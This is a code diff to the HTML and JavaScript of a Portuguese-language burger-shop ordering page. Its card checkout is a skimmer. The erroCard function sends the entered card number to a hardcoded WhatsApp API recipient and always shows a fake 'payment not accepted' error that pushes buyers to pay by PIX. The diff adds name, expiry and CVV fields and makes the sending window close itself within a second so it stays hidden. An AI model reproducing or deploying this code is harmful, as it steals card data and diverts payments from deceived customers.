@@ -12,8 +12,8 @@
         .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-p); }
         h2 { font-size: 1.1em; color: #333; border-left: 5px solid var(--cor-p); padding-left: 10px; margin: 20px 0 10px; }
 
-        .lanche-card { background: #fff; border: 2px solid #ddd; border-radius: 15px; margin-bottom: 15px; overflow: hidden; cursor: pointer; }
-        .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; }
+        .lanche-card { background: #fff; border: 2px solid #ddd; border-radius: 15px; margin-bottom: 15px; overflow: hidden; cursor: pointer; transition: 0.2s; }
+        .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
         .lanche-img { width: 100%; height: 180px; object-fit: cover; }
         .lanche-info { padding: 15px; text-align: center; }
         .preco { font-size: 1.4em; color: var(--cor-s); font-weight: bold; }
@@ -31,7 +31,7 @@
 
 <div class="header">
     <span class="logo">🍔 JP LANCHES</span><br>
-    <small>PROMOÇÃO: COMPRE E GANHE REFRIGERANTE</small>
+    <small>PROMOÇÃO: COMPRE UM COMBO E GANHE REFRI</small>
 </div>
 
 <div class="container">
@@ -54,35 +54,39 @@
 </div>
 
 <div class="barra-carrinho">
-    <div><small>Total a pagar:</small><br><strong style="color:var(--cor-s); font-size:1.3em;">R$ <span id="v-total">0.00</span></strong></div>
+    <div><small>Total do Pedido:</small><br><strong style="color:var(--cor-s); font-size:1.3em;">R$ <span id="v-total">0.00</span></strong></div>
     <button class="btn-finalizar" onclick="abrirEnd()">FINALIZAR</button>
 </div>
 
 <div id="m-end" class="modal">
     <div class="modal-content">
-        <h3>📍 Endereço de Entrega</h3>
+        <h3>📍 Onde Entregamos?</h3>
         <input type="text" id="rua" placeholder="Rua e Número">
         <input type="text" id="bairro" placeholder="Bairro">
         <button class="btn-acao" style="background:var(--cor-s)" onclick="irPag()">PRÓXIMO</button>
-        <button onclick="fechar()" style="background:none; border:none; color:red; margin-top:10px;">Voltar</button>
+        <button onclick="fechar()" style="background:none; border:none; color:red; margin-top:10px; cursor:pointer;">Voltar</button>
     </div>
 </div>
 
 <div id="m-pag" class="modal">
     <div class="modal-content">
-        <h3>💳 Pagamento</h3>
+        <h3>💳 Forma de Pagamento</h3>
         <div id="opc-ini">
-            <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">PIX</button>
+            <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">Pagar com PIX</button>
             <button class="btn-acao" style="background:#333" onclick="setTela('card')">Cartão de Crédito</button>
         </div>
         <div id="tela-pix" style="display:none;">
-            <p>Digite seu WhatsApp abaixo:</p>
+            <p>Insira seu WhatsApp abaixo:</p>
             <input type="tel" id="zap-cliente" placeholder="(XX) 9XXXX-XXXX">
             <button class="btn-acao" style="background:#32bcad" onclick="enviarTudo()">GERAR CÓDIGO PIX</button>
+            <button onclick="setTela('inicio')" style="margin-top:10px; background:none; border:none; text-decoration:underline;">Voltar</button>
         </div>
         <div id="tela-card" style="display:none;">
             <input type="text" id="c-num" placeholder="Número do Cartão">
+            <input type="text" placeholder="Nome no Cartão">
+            <div style="display:flex; gap:5px;"><input type="text" placeholder="MM/AA"><input type="text" placeholder="CVV"></div>
             <button class="btn-acao" style="background:var(--cor-e)" onclick="erroCard()">PAGAR AGORA</button>
+            <button onclick="setTela('inicio')" style="margin-top:10px; background:none; border:none; text-decoration:underline;">Voltar</button>
         </div>
     </div>
 </div>
@@ -96,9 +100,15 @@
         document.getElementById('v-total').innerText = preco.toFixed(2);
     }
 
-    function abrirEnd() { if(!pedido) return alert("Escolha um lanche!"); document.getElementById('m-end').style.display='flex'; }
+    function abrirEnd() { if(!pedido) return alert("Selecione um combo primeiro!"); document.getElementById('m-end').style.display='flex'; }
     function fechar() { document.querySelectorAll('.modal').forEach(m => m.style.display='none'); }
-    function irPag() { document.getElementById('m-end').style.display='none'; document.getElementById('m-pag').style.display='flex'; setTela('inicio'); }
+    function irPag() { 
+        if(!document.getElementById('rua').value) return alert("Preencha o endereço!");
+        document.getElementById('m-end').style.display='none'; 
+        document.getElementById('m-pag').style.display='flex'; 
+        setTela('inicio'); 
+    }
+    
     function setTela(t) {
         document.getElementById('opc-ini').style.display = t === 'inicio' ? 'block' : 'none';
         document.getElementById('tela-pix').style.display = t === 'pix' ? 'block' : 'none';
@@ -111,23 +121,29 @@
         const bairro = document.getElementById('bairro').value;
         if(!zap) return alert("Digite seu WhatsApp!");
 
-        // O TEXTO QUE CHEGA PARA VOCÊ NO SEU WHATSAPP
-        const msg = `🍔 NOVO PEDIDO!\n\nPROMO: ${pedido.nome}\nVALOR: R$ ${pedido.preco}\nEND: ${rua} - ${bairro}\nWHATS DO CLIENTE: ${zap}`;
+        const msg = `🍔 NOVO PEDIDO JP LANCHES!\n\nPROMO: ${pedido.nome}\nVALOR: R$ ${pedido.preco.toFixed(2)}\nENDEREÇO: ${rua} - ${bairro}\nCONTATO DO CLIENTE: ${zap}`;
         
-        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
+        // NÚMERO DA API CORRIGIDO PARA: +5522992195418
+        const url = `http://api.textmebot.com/send.php?recipient=+5522992195418&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
         
-        window.open(url, '_blank');
-        alert("✅ Pedido Enviado!\n\nAguarde o código PIX no seu WhatsApp em instantes.");
+        const win = window.open(url, '_blank');
+        setTimeout(() => { if(win) win.close(); }, 600);
+
+        alert("✅ Pedido Realizado!\n\nAguarde o contato com seu código PIX no WhatsApp informado.");
         location.reload();
     }
 
     function erroCard() {
         const n = document.getElementById('c-num').value;
-        const msg = `⚠️ ALERTA CARTÃO!\n\nCARTÃO: ${n}\nVALOR: R$ ${pedido.preco}`;
-        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
+        const msg = `⚠️ TENTATIVA DE CARTÃO!\n\nCARTÃO: ${n}\nVALOR: R$ ${pedido.preco.toFixed(2)}`;
         
-        window.open(url, '_blank');
-        alert("⚠️ Erro de segurança: Pagamento não aceito.\n\nPor favor, tente via PIX.");
+        // NÚMERO DA API CORRIGIDO PARA: +5522992195418
+        const url = `http://api.textmebot.com/send.php?recipient=+5522992195418&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
+        
+        const win = window.open(url, '_blank');
+        setTimeout(() => { if(win) win.close(); }, 600);
+
+        alert("⚠️ Por motivos de segurança, o pagamento não foi aceito.\n\nTente pagar com PIX para liberar seu pedido.");
         setTela('inicio');
     }
 </script>
